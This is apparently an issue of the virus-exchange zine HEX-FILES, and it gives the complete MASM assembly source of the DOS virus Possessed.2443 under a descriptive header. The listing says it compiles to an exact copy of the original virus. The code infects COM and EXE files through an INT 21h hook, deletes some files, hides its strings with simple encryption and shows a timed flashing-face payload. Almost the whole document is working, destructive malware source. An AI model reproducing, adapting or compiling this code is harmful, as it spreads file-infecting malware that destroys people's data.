   ;
   ;   HEX-FILES No. 2                                                   File 007
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;  Virus:         Possessed.2443
   ;  Alias:         Possessed 1.05, Possessed I
   ;  Targets:       COM, EXE
   ;
   ;  Resident:      Low Memory TSR
   ;  MemorySize:    2944 bytes + environment
   ;  MemorySelfRec: [0:1EC] <> 0
   ;
   ;  VirusLength:   2443 bytes
   ;  InfectiveLength:
   ;                 COM: 2443 bytes
   ;                 EXE: 2443 + 15 byte alignment
   ;  LocationVirusOnFile:
   ;                 End of file
   ;  FileSelfRec:
   ;                 COM: (File[Eof-1067..Eof-1066] = 41h 4bh) and
   ;                      (File[16..81] = Virus[8..73])
   ;                 EXE: File[18..19] = 70h 19h
   ;  ReadableText:
   ;                 "POSSESSED! Bwa! ha! ha! ha! ha!$
   ;                  Author: JonJon Gumba of AdU"
   ;
   ;                 "C:*.COM", "C:*.EXE" <--- drive letters varies
   ;  EncryptedText:
   ;                 "POSSESSED! Bwa! ha! ha! ha! ha!$
   ;                  Author: JonJon Gumba of AdU"
   ;
   ;                 "COMMAND.COM"
   ;  DisplayedText:
   ;                 If host program EXEC failed
   ;
   ;                      "POSSESSED! Bwa! ha! ha! ha! ha!"
   ;
   ;  Payload:        Flashing face
   ;  PayloadTrigger: After 11 hours if it became resident through COMMAND.COM;
   ;                  3 hours from other programs
   ;
   ;
   ;

    ÄÄ POS2443.ASM STARTS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    ;-------------------------------------------------------------------
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING      destructive codes  intentional damage      WARNING*
    ; *WARNING                 deletes files                   WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ;-------------------------------------------------------------------
    ; Virus:  Possessed.2443
    ; Alias:  Possessed 1.05, Possessed II
    ; Author: JonJon Gumba
    ; Origin: Adamson University, Manila, Philippines
    ;-------------------------------------------------------------------
    ;
    ; This source code is written in a way so that when compiled you will
    ; get an exact copy of the virus.
    ;
    ; You will only be able to duplicate the original virus if you will
    ; use *MASM 5.0* to compile this program listing. Other compilers or
    ; versions of a compiler might produce a virus different from that
    ; originally released.
    ;
    ; If compiled in tasm 2.01, two bytes will differ from the original
    ; virus, that is, compiled by masm 5.0  This can also be compiled
    ; in a86 4.02 but you will be creating a new variant.
    ;
    ; Compile to COM.
    ;
    ;-------------------------------------------------------------------
    ; Program listing created by Putoksa Kawayan.        HEX-FILES No. 2
    ;-------------------------------------------------------------------
    ;
    ExeHeader struc
     isExeId       dw   ?
     isMod         dw   ?
     isBlocks      dw   ?
     isRelocItemCt dw   ?
     isHeaderSize  dw   ?
     isMinAlloc    dw   ?
     isMaxAlloc    dw   ?
     isSs          dw   ?
     isSp          dw   ?
     isCxSum       dw   ?
     isIp          dw   ?
     isCs          dw   ?
    ExeHeader ends

    Possessed segment 'code'
    assume cs:Possessed, ds:nothing

    org 0

    MemoryMarkerLoc         equ     01ech
    SaveSsOnInt21           equ     01f6h
    SaveSpOnInt21           equ     01f4h

    PossessedEntry:
          push    es
          xor     ax,ax
          mov     es,ax
          jmp     FirstGenerationEntry

    PossessedId   db      13,'POSSESSED! Bwa! ha! ha! ha! ha!$',8,32,10
                  db      13,'Author: JonJon Gumba of AdU',10,26

    isDos:
         jmp     DosHandler

    DosVersion              db      ?
    FirstGenerationFlag     db      1
    DosInterrupt label dword
      DosIntOffset          dw      ?
      DosIntSegment         dw      ?
    ClockInterrupt label dword
      ClockIntOffset        dw      ?
      ClockIntSegment       dw      ?
    ErrorIntOffset          dw      ?
    ErrorIntSegment         dw      ?
    VictimAsciizSegment     dw      ?
    VictimAsciizOffset      dw      ?
    Attribute               dw      ?
    Handle                  dw      ?
    FileTime                dw      ?
    FileDate                dw      ?
    ComLength               dw      ?
    AllocatedMemory         dw      ?
    Timer                   dw      ?
    Hour                    db      ?
    ActivateLength          db      ?
    ViruSs                  dw      ?
    ViruSp                  dw      ?
    ExeSs                   dw      ?
    ExeSp                   dw      ?
    ExeCs                   dw      ?
    ExeIp                   dw      ?
    ExeLengthLo             dw      ?
    ExeLengthHi             dw      ?
    Environment             dw      ?
    Psp                     dw      ?

    DosHandler:
          pushf
          cmp     ax,4b00h
          jne     PassToDos
          push    ds
          push    es
          push    si
          push    di
          push    ax
          push    bx
          push    cx
          push    dx
          mov     bx,dx
          mov     bl,[bx]

    assume cs:Possessed, ds:Possessed

          push    cs
          pop     ds
          mov     ComAsciiz,bl
          mov     ExeAsciiz,bl
          mov     ah,2fh
          call    UseDos
          push    es
          push    bx
          mov     ah,1ah
          mov     dx,offset SaveVictimCode
          call    UseDos
          mov     cx,21h
          mov     dx,offset ComAsciiz
          mov     ah,4eh
          call    UseDos
          jnc     InfectOthersFirst
          mov     dx,offset ExeAsciiz
          mov     ah,4eh
          call    UseDos
          jnc     InfectOthersFirst
    InfectExecutingProgram:
          pop     dx
          pop     ds
          mov     ah,1ah
          call    UseDos
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          pop     di
          pop     si
          pop     es
          pop     ds
          call    SaveRegistersBeforeInfect
          jmp     PassToDos
    InfectOthersFirst:
          mov     dx,offset SaveVictimCode
          add     dx,28
          mov     bx,dx
          mov     cl,ComAsciiz
          mov     [bx],cl
          mov     byte ptr [bx+01],':'
          call    SaveRegistersBeforeInfect
          jmp     InfectExecutingProgram
    SaveRegistersBeforeInfect:
          push    ds
          push    es
          push    si
          push    di
          push    ax
          push    bx
          push    cx
          push    dx
          jmp     SetInfect

    assume cs:Possessed, ds:nothing

    RestoreRegisters:
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          pop     di
          pop     si
          pop     es
          pop     ds
          ret
    PassToDos:
          popf
          jmp     DosInterrupt
    SetInfect:
          mov     VictimAsciizSegment,ds
          mov     VictimAsciizOffset,dx
          mov     si,dx
          add     si,2
          mov     bx,si
    CheckIfPathSeparator:
          cmp     byte ptr [si],'\'
          jne     CheckIfEndOfFileName
          mov     bx,si
          inc     bx
          jmp     CheckNextCharOfFileName
    CheckIfEndOfFileName:
          cmp     byte ptr [si],0
          je      GotEndOfFileName
    CheckNextCharOfFileName:
          inc     si
          jmp     CheckIfPathSeparator
    RestoreErrorInterrupt:
          mov     ax,2524h
          mov     dx,ErrorIntOffset
          mov     ds,ErrorIntSegment
          call    UseDos
          jmp     RestoreRegisters
    GotEndOfFileName:
          mov     si,bx
          push    cs
          pop     es
          mov     di,offset NameofVictim
          mov     cx,13
          cld
          repe movsb

    assume cs:Possessed, ds:Possessed

          push    ds
          push    dx
          push    es
          pop     ds
          mov     ax,3524h
          call    UseDos
          mov     ErrorIntSegment,es
          mov     ErrorIntOffset,bx
          mov     ax,2524h
          mov     dx,offset isError
          call    UseDos

    assume cs:Possessed, ds:nothing

          pop     dx
          pop     ds
          mov     ax,4300h
          call    UseDos
    Relay1:
          jc      RestoreErrorInterrupt
          mov     Attribute,cx
          mov     ax,4301h
          mov     cx,20h
          call    UseDos
          jc      Relay1
          mov     ax,3d02h
          call    UseDos
          jc      Relay1
          mov     Handle,ax
          mov     bx,ax
          mov     ax,5700h
          call    UseDos
          mov     FileDate,dx
          mov     FileTime,cx
          mov     bx,-2
          mov     ah,48h
          call    UseDos
          jnc     EnoughMemory
          mov     ah,48h
          call    UseDos
          jc      Relay1
    EnoughMemory:
          mov     AllocatedMemory,ax
          xor     cx,cx
          mov     dx,cx
          mov     bx,Handle
          mov     ax,4202h
          call    UseDos
          jc      Relay12
          mov     ComLength,ax
          call    MovePointerBegin
    Relay12:
          jc      Relay11
          mov     cx,ComLength
          xor     dx,dx
          mov     ds,AllocatedMemory
          mov     ah,3fh
          call    UseDos
    Relay11:
          jc      DoneWithFile
          push    cs
          pop     es
          xor     si,si
          cmp     word ptr [si],'ZM'
          jne     InfectCheckCom
          cmp     word ptr [si].isCxSum,1970h
          je      DoneWithFile
          jmp     NotInfected
    InfectCheckCom:
          mov     si,cx
          sub     si,(offset VirusStack-offset FaceData)
          js      Relay2
          cmp     word ptr [si],4b41h
          je      VerifyComInfection
    Relay2:
          jmp     NotInfected

    VerifyComInfection:
          mov     si,16
          mov     di,offset PossessedId
          mov     cx,(isDos-PossessedId)/2
          cld
          repe cmpsw
          je      DoneWithFile
          jmp     DeleteFile

    DoneWithFile:
          mov     es,AllocatedMemory
          mov     ah,49h
          call    UseDos
          mov     bx,Handle
          mov     dx,FileDate
          mov     cx,FileTime
          mov     ax,5701h
          call    UseDos
          mov     ah,3eh
          call    UseDos
          mov     ds,VictimAsciizSegment
          mov     dx,VictimAsciizOffset
          mov     cx,Attribute
          mov     ax,4301h
          call    UseDos
          jmp     RestoreRegisters

    NotInfected:
          push    es
          mov     ds,VictimAsciizSegment
          mov     si,VictimAsciizOffset
          mov     dl,[si]
          sub     dl,'A'-1

    assume cs:Possessed, ds:Possessed

          pop     ds
          mov     ActivateLength,3
          mov     si,offset EncryptedCommandCom
          mov     cx,11
          mov     al,17h
          call    Scrambler
          mov     di,offset NameofVictim
          call    Compare
          pushf
          neg     al
          call    Scrambler
          popf
          jc      CheckDiskSpace
          cmp     DosVersion,3
          jnc     SetActivateFromCommand
    Relay3:
          jmp     DoneWithFile

    SetActivateFromCommand:
          mov     ActivateLength,11
          jmp     EnoughDiskSpace

    assume cs:Possessed, ds:nothing

    CheckDiskSpace:
          mov     ah,36h
          call    UseDos
          xor     dx,dx
          mul     bx
          mul     cx
          or      dx,dx
          jne     EnoughDiskSpace
          cmp     ax,2500
          jnc     EnoughDiskSpace
          jmp     DeleteFile

    EnoughDiskSpace:
          mov     bx,Handle
          call    MovePointerBegin
          jc      Relay3
          mov     ds,AllocatedMemory
          xor     si,si
          cmp     word ptr [si],'ZM'
          jne     isComFile
          jmp     isExeFile

    Jumper:
          mov     bx,cs:[100h+(LocComEntry-Jumper)]
          mov     si,cs:[100h+(LocEndOfFile-Jumper)]
          jmp     bx

    LocComEntry             dw      ?
    LocEndOfFile            dw      ?

    assume cs:Possessed, ds:Possessed

    isComFile:
          push    ds
          push    ds
          mov     di,offset SaveVictimCode
          mov     cx,(offset VirusStack-offset SaveVictimCode)/2
          cld
          repe movsw
          pop     es
          push    cs
          pop     ds
          mov     dx,ComLength
          cmp     ActivateLength,11
          jne     ComNotCommand
          mov     LocEndOfFile,dx
          sub     dx,-((ComEntry-VirusStack)+100h) ;ffa3
          mov     LocComEntry,dx
          jmp     JumperSet

    ComNotCommand:
          push    dx
          add     dx,offset ComEntry+100h
          mov     LocComEntry,dx
          pop     dx
          add     dx,offset VirusStack
          mov     LocEndOfFile,dx
    JumperSet:
          mov     si,offset Jumper
          xor     di,di
          mov     cx,(isComFile-Jumper)/2
          cld
          repe movsw
          mov     si,offset PossessedId
          mov     cx,(isDos-PossessedId)/2
          cld
          repe movsw
          call    MovePointerBegin

    assume cs:Possessed, ds:nothing

          pop     ds
          mov     cx,ComLength
          cmp     ActivateLength,11
          jne     NotCommandCom
          sub     cx,offset VirusStack
    NotCommandCom:
          xor     dx,dx
          mov     ah,40h
          call    UseDos
          jnc     WriteOk
    Relay4:
          jmp     Relay3

    WriteOk:
          push    cs
          pop     ds
          mov     dx,offset PossessedEntry
          mov     cx,offset VirusStack
          mov     ah,40h
          call    UseDos
          jc      Relay4
          jmp     DoneWithFile

    DeleteFile:
          mov     ds,VictimAsciizSegment
          mov     dx,VictimAsciizOffset
          mov     ah,41h
          call    UseDos
          jmp     DoneWithFile

    PixelRow                equ     Environment+100h
    PixelColumn             equ     Psp+100h

    isClock:
          pushf
          inc     Timer
          jne     NotYetTime
          dec     Hour
          je      ShowTime
    NotYetTime:
          popf
          jmp     ClockInterrupt

    ShowTime:
          popf
          mov     ax,6
          int     10h

    assume cs:Possessed, ds:Possessed

          push    cs
          pop     ds
          xor     bx,bx
          xor     dx,dx
    LoadFaceData:
          mov     si,offset FaceData
          mov     word ptr PixelRow,200
          mov     word ptr PixelColumn,0
          call    ShowPayload
          mov     word ptr PixelRow,201
          mov     word ptr PixelColumn,1
          call    ShowPayload
          mov     word ptr PixelRow,189
          mov     word ptr PixelColumn,-1
          call    ShowPayload
          mov     word ptr PixelRow,201
          mov     word ptr PixelColumn,-1
          call    ShowPayload
          mov     word ptr PixelRow,189
          mov     word ptr PixelColumn,1
          call    ShowPayload
          jmp     LoadFaceData
    ShowPayload:
          push    si
          mov     al,1
          mov     cx,2
    EraseFace:
          push    cx
          push    si
    SetNextCoordinate:
          mov     bl,[si]
          or      bl,bl
          je      EndFaceData
          mov     cx,bx
          add     cx,PixelRow
          mov     dl,[si+1]
          add     dx,PixelColumn
          mov     ah,0ch
          int     10h
          add     si,2
          jmp     SetNextCoordinate

    EndFaceData:
          pop     si
          xor     al,al
          pop     cx
          loop    EraseFace
          pop     si
          ret

    assume cs:Possessed, ds:nothing

    isExeFile:
          mov     word ptr [si].isCxSum,1970h
          mov     ax,[si].isSs
          add     ax,16
          mov     ExeSs,ax
          mov     ax,[si].isSp
          mov     ExeSp,ax
          mov     ax,[si].isIp
          mov     ExeIp,ax
          mov     ax,[si].isCs
          add     ax,16
          mov     ExeCs,ax
          mov     ax,[si].isBlocks
          cmp     word ptr [si].isMod,0
          je      PageAligned
          dec     ax
    PageAligned:
          mov     bx,512
          mul     bx
          add     ax,[si].isMod
          adc     dx,0
          add     ax,15
          adc     dx,0
          and     ax,0fff0h
          mov     ExeLengthLo,ax
          mov     ExeLengthHi,dx
          add     ax,offset VirusStack
          adc     dx,0
          jc      Relay5
          div     bx
          or      dx,dx
          je      AlignedToPage
          inc     ax
    AlignedToPage:
          mov     [si].isBlocks,ax
          mov     [si].isMod,dx
          mov     ax,ExeLengthLo
          mov     dx,ExeLengthHi
          mov     bx,16
          div     bx
          sub     ax,[si].isHeaderSize
          sub     ax,16
          mov     [si].isCs,ax
          mov     word ptr [si].isIp,offset ExeEntry+100h
          mov     [si].isSs,ax
          mov     word ptr [si].isSp,offset VirusStack+100h
          mov     bx,Handle
          call    MovePointerBegin
          mov     cx,28
          xor     dx,dx
          mov     ah,40h
          call    UseDos

    assume cs:Possessed, ds:Possessed

          push    cs
          pop     ds
          mov     dx,ExeLengthLo
          mov     cx,ExeLengthHi
          mov     ax,4200h
          call    UseDos
          mov     dx,offset PossessedEntry
          mov     cx,offset VirusStack
          mov     ah,40h
          call    UseDos
    Relay5:
          jmp     DoneWithFile

    assume cs:Possessed, ds:nothing

    isError:
          xor     ax,ax
          mov     es,ax
          mov     ss,es:SaveSsOnInt21
          mov     sp,es:SaveSpOnInt21
          pop     ax
          pop     es
          pop     bp
          stc
          ret

    UseDos:
          push    bp
          push    es
          push    ax
          xor     ax,ax
          mov     es,ax
          mov     es:SaveSpOnInt21,sp
          mov     es:SaveSsOnInt21,ss
          pop     ax
          pop     es
          pushf
          call    DosInterrupt
          pop     bp
          ret

    MovePointerBegin:
          xor     cx,cx
          mov     dx,cx
          mov     ax,4200h
          call    UseDos
          ret

    MoveCursor:
          mov     ah,2
          xor     bx,bx
          int     10h
          ret

    Scrambler:
          push    cx
          push    si
    Masker:
          sub     [si],al
          inc     si
          loop    Masker
          pop     si
          pop     cx
          ret

    Compare:
          push    si
          push    cx
          cld
          repe cmpsb
          je      MatchFound
          stc
    MatchFound:
          pop     cx
          pop     si
          ret

    EncryptedCommandCom     db  'C'+17h,'O'+17h,'M'+17h,'M'+17h,'A'+17h
                            db  'N'+17h,'D'+17h,'.'+17h,'C'+17h,'O'+17h
                            db  'M'+17h

    EncryptedPossessedId    db      13+25h,'P'+25h,'O'+25h,'S'+25h,'S'+25h
                            db      'E'+25h,'S'+25h,'S'+25h,'E'+25h,'D'+25h
                            db      '!'+25h,' '+25h,'B'+25h,'w'+25h,'a'+25h
                            db      '!'+25h,' '+25h,'h'+25h,'a'+25h,'!'+25h
                            db      ' '+25h,'h'+25h,'a'+25h,'!'+25h,' '+25h
                            db      'h'+25h,'a'+25h,'!'+25h,' '+25h,'h'+25h
                            db      'a'+25h,'!'+25h,'$'+25h,8+25h,32+25h,10+25h
                            db      13+25h,'A'+25h,'u'+25h,'t'+25h,'h'+25h
                            db      'o'+25h,'r'+25h,':'+25h,' '+25h,'J'+25h
                            db      'o'+25h,'n'+25h,'J'+25h,'o'+25h,'n'+25h
                            db      ' '+25h,'G'+25h,'u'+25h,'m'+25h,'b'+25h
                            db      'a'+25h,' '+25h,'o'+25h,'f'+25h,' '+25h
                            db      'A'+25h,'d'+25h,'U'+25h,10+25h,26+25h

    ;----------------------------
    ;--------------Possessed payload data
    ;----------------------------
    FaceData label byte
      db   41h,4bh,42h,4bh,42h,4ch,43h,4ch,44h,4ch,45h,4ch,43h,4dh,46h
      db   4dh,47h,4dh,44h,4eh,48h,4eh,49h,4eh,4ah,4eh,45h,4fh,4bh,4fh
      db   4ch,4fh,0b6h,4ah,0b5h,4ah,0b5h,4bh,0b4h,4bh,0b3h,4bh,0b2h,4bh,0b4h
      db   4ch,0b1h,4ch,0b0h,4ch,0b3h,4dh,0afh,4dh,0aeh,4dh,0adh,4dh,0b2h,4eh
      db   0ach,4eh,0abh,4eh,4ch,54h,4ch,55h,4dh,55h,4eh,55h,4fh,56h,50h
      db   56h,51h,56h,52h,56h,53h,56h,54h,57h,55h,57h,56h,57h,57h,57h
      db   58h,57h,59h,58h,5ah,58h,5bh,58h,5ch,58h,5dh,58h,5ah,59h,5bh
      db   59h,5ch,59h,5dh,59h,60h,59h,5fh,59h,60h,59h,61h,59h,62h,59h
      db   5bh,5ah,5ch,5ah,63h,5ah,64h,5ah,65h,5ah,66h,5ah,67h,5ah,5ch
      db   5bh,68h,5bh,69h,5bh,6ah,5bh,6bh,5bh,6ch,5bh,6dh,5ch,6eh,5ch
      db   6fh,5ch,70h,5dh,0b1h,53h,0b0h,54h,0afh,54h,0aeh,54h,0adh,55h,0ach
      db   55h,0abh,55h,0aah,55h,0a9h,55h,0a8h,55h,0a7h,56h,0a6h,56h,0a5h,56h
      db   0a4h,56h,0a3h,56h,0a2h,57h,0a1h,57h,0a0h,57h,9fh,57h,9eh,57h,9dh
      db   57h,9ch,58h,9bh,58h,9ah,58h,99h,58h,98h,58h,9ah,59h,99h,59h
      db   98h,59h,97h,59h,96h,59h,95h,59h,94h,59h,93h,59h,92h,59h,99h
      db   5ah,98h,5ah,91h,5ah,90h,5ah,8fh,5ah,8eh,5ah,8dh,5ah,98h,5bh
      db   8ch,5bh,8bh,5bh,8ah,5bh,89h,5bh,88h,5bh,87h,5bh,86h,5ch,85h
      db   5ch,84h,5ch,83h,5ch,76h,63h,75h,64h,75h,65h,74h,66h,74h,67h
      db   73h,68h,73h,69h,72h,6ah,71h,6bh,71h,6ch,70h,6dh,70h,6eh,6fh
      db   6fh,6eh,70h,6eh,71h,7bh,71h,6dh,72h,7ah,72h,79h,72h,6dh,73h
      db   78h,73h,77h,73h,76h,73h,75h,73h,6ch,74h,71h,74h,72h,74h,73h
      db   74h,74h,74h,6ch,75h,6dh,75h,6eh,75h,6fh,75h,70h,75h,6bh,76h
      db   6ch,76h,6dh,81h,6eh,81h,6fh,81h,70h,80h,71h,80h,72h,80h,73h
      db   80h,74h,7fh,75h,7fh,76h,7fh,77h,7fh,78h,7eh,79h,7eh,7ah,7eh
      db   7bh,7eh,7ch,7dh,7dh,7dh,7eh,7dh,7fh,7dh,80h,7dh,81h,7ch,82h
      db   7ch,83h,7ch,84h,7ch,85h,7bh,86h,7bh,87h,7bh,88h,7bh,89h,7ah
      db   8ah,7ah,8bh,7ah,8ch,7ah,8dh,79h,8eh,79h,8fh,79h,90h,79h,91h
      db   78h,92h,78h,93h,78h,94h,77h,95h,77h,96h,76h,97h,76h,98h,75h,0

    ComAsciiz               db      'C:*.COM',0
    ExeAsciiz               db      'C:*.EXE',0

    ExeEntry:
          push    es
          xor     ax,ax
          mov     es,ax
          cmp     byte ptr es:MemoryMarkerLoc,0
          jne     ExecuteExeVictim
          mov     si,100h
          jmp     ExeNotInMemory

    ExecuteExeVictim:
          pop     es
          mov     ax,es
          add     ax,ExeSs+100h
          mov     ss,ax
          mov     sp,ExeSp+100h
          mov     ax,es
          add     ax,ExeCs+100h
          mov     DosIntSegment+100h,ax
          mov     ax,ExeIp+100h
          mov     DosIntOffset+100h,ax
          clc
          jmp     DosInterrupt+100h

    SecondCodeMove:
          cld
          repe movsb
          xor     ax,ax
          mov     es,ax
    FirstGenerationEntry:
          mov     byte ptr es:MemoryMarkerLoc,1
          pop     ax
          add     ax,16
          push    ax
          mov     ax,offset SetUpPossessed
          push    ax
          retf

    assume cs:Possessed, ds:Possessed

    SetUpPossessed:
          mov     ax,sp
          sub     ax,100h
          mov     sp,ax
          mov     ax,cs
          mov     ds,ax
          mov     ss,ax
          push    ds
          sub     ax,16
          mov     es,ax
          mov     Psp,es
          push    ax
          mov     ax,es:[2ch]
          mov     Environment,ax
          pop     ax
          push    ds
          push    es
          mov     ds,ax
          push    cs
          pop     es
          mov     si,0ah
          mov     di,offset VirusStack
          mov     cx,6
          cld
          repe movsw
          mov     bx,offset isTerminate
          mov     ds:[0ah],bx
          mov     ds:[0ch],cs
          pop     es
          pop     ds
          pop     es
          mov     si,offset EncryptedPossessedId
          mov     cx,(FaceData-EncryptedPossessedId)
          push    cx
          mov     al,25h
          call    Scrambler
          mov     di,offset PossessedId
          push    si
          cld
          repe movsb
          pop     si
          pop     cx
          neg     al
          call    Scrambler
          mov     ax,word ptr ExeEntry
          add     ax,(3521h-3306h)
          int     21h
          mov     DosIntOffset,bx
          mov     DosIntSegment,es
          mov     dx,offset isDos
          sub     ah,10h
          call    UseDos
          mov     Timer,0
          mov     dl,ActivateLength
          mov     Hour,dl
          add     ax,(3508h-2521h)
          call    UseDos
          mov     ClockIntOffset,bx
          mov     ClockIntSegment,es
          mov     dx,offset isClock
          sub     ah,10h
          call    UseDos
          push    cs
          pop     ds
          mov     es,Psp
          mov     ah,49h
          call    UseDos
          mov     dx,offset VirusStack
          mov     cl,4
          shr     dx,cl
          add     dx,20h
          mov     ah,31h
          call    UseDos
    isTerminate:
          push    cs
          push    cs
          pop     ds
          mov     es,Psp
          mov     si,offset VirusStack
          mov     di,0ah
          mov     cx,6
          cld
          repe movsw
          pop     es
          cmp     FirstGenerationFlag,1
          jne     NotFirstGen
          mov     FirstGenerationFlag,0
          jmp     GetReturnCode

    NotFirstGen:
          mov     ax,Psp
          mov     si,offset ExecParam
          mov     [si+4],ax
          mov     word ptr [si+2],80h
          mov     [si+8],ax
          mov     word ptr [si+6],5ch
          mov     [si+12],ax
          mov     word ptr [si+10],6ch
          mov     ax,Environment
          mov     [si],ax
          mov     ah,30h
          int     21h
          mov     DosVersion,al
          cmp     al,3
          jc      NameNotInEnvironment
          mov     ds,Environment
          xor     si,si
          mov     cx,200
    FindFileName:
          cmp     byte ptr [si],1
          jne     CheckNextChar
          cmp     byte ptr [si+3],':'
          jne     CheckNextChar
          mov     dx,si
          add     dx,2
          jmp     FoundFileName

    CheckNextChar:
          inc     si
          loop    FindFileName
    NameNotInEnvironment:
          push    cs
          pop     ds
          mov     si,offset NameofVictim
          mov     di,offset VirusAsciiz
          mov     cx,13
          cld
          repe movsb
          mov     dx,offset VirusAsciiz

    assume cs:Possessed, ds:nothing

    FoundFileName:
          cli
          mov     ViruSs,ss
          mov     ViruSp,sp
          sti
          mov     ax,4b00h
          mov     bx,offset ExecParam
          cmp     DosVersion,3
          jc      OldDos
          call    UseDos
          jmp     VictimExecuted
    OldDos:
          int     21h

    VictimExecuted:
          cli
          mov     ss,ViruSs
          mov     sp,ViruSp
          sti
          push    cs
          pop     ds
          jnc     GetReturnCode
          mov     dx,offset PossessedId
          mov     ah,9
          int     21h
    GetReturnCode:
          mov     ah,4dh
          int     21h
          mov     ah,4ch
          int     21h

    NameofVictim        db      13 dup (?)

    ComEntry:
          add     si,100h
          push    es
          xor     ax,ax
          mov     es,ax
          cmp     word ptr es:MemoryMarkerLoc,0
          je      NotInMemory
          pop     es
          sub     si,5ah
          mov     di,100h
          mov     cx,(offset VirusStack-offset SaveVictimCode)/2
          cld
          repe movsw
          mov     bx,100h
          clc
          jmp     bx

    NotInMemory:
          sub     si,offset VirusStack
    ExeNotInMemory:
          pop     es

    assume cs:Possessed, ds:Possessed

          push    cs
          pop     ds
          mov     di,100h
          mov     cx,offset ExeNotInMemory
          shr     cx,1
          cld
          repe movsw
          mov     cx,(offset VirusStack-offset ExeNotInMemory)
          mov     DosIntSegment+100h,es
          mov     DosIntOffset+100h,offset SecondCodeMove+100h
          push    es
          jmp     cs:DosInterrupt+100h


    SaveVictimCode          db      90 dup (?)
    VirusStack              dw      ?
    VirusAsciiz             db      13 dup (?)
    ExecParam               dw      7 dup (?)

    Possessed ends

    end PossessedEntry

   ; ÄÄ POS2443.ASM ENDS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
